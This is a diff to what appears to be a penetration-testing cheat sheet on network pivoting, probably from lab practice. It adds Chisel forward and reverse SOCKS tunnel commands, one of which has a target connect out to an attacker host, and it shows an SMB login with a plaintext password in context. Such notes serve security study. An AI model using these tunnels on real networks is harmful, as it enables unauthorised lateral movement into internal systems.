@@ -77,6 +77,16 @@ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24   //so
 kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234   
 
 **Chisel**  
+https://github.com/jpillora/chisel/releases      //download chisel  
+---Forward---
+./chisel server -v -p 1234 --socks5  //on target  
+./chisel client -v 10.129.202.64:1234 socks  //on kali, starts a socks on port 1080 configure socks, use proxychains  
+---reverse---  
+sudo ./chisel server --reverse -v -p 1234 --socks5  //on kali  
+./chisel client -v 10.10.14.17:1234 R:socks  //on target connect to kali, config socks 1080 on kali and use proxychains      
+
+**with msfconsole**   
+
 
 ## Windows  
 On Windows versions with SSH installed,  
